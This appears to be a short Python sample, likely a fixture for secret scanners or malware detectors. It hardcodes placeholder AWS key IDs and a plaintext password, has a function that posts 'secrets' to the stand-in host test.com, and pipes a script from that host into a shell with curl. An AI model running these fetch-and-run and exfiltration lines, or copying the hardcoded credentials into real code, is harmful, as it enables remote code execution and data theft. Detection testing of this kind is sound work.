import os
import subprocess
from urllib import request, parse

AWS_Secret_1 = "AKIA1234ABCD5678EFGH"
AWS_Secret_2 = "AKIAIOSFODNN7EXAMPLE"
AWS_Secret_3 = "AKIA9EXAMPLE12345678"

def login(username):
    password = "SuperSecret123!"
    if username == "admin" and password == "SuperSecret123!":
        print("Login successful")
    else:
        print("Access denied")

def exfiltrate_data():
    data = parse.urlencode({"secrets": "top_secret_data"}).encode()
    req = request.Request("http://test.com/upload", data=data)
    response = request.urlopen(req)
    print("Data exfiltrated:", response.getcode())

def run_code_8192():
    cmd = "curl http://test.com/e71829.sh | sh"
    subprocess.call(cmd, shell=True)

def main():
    login("admin")
    exfiltrate_data()
    run_code_8192()

if __name__ == "__main__":
    main()
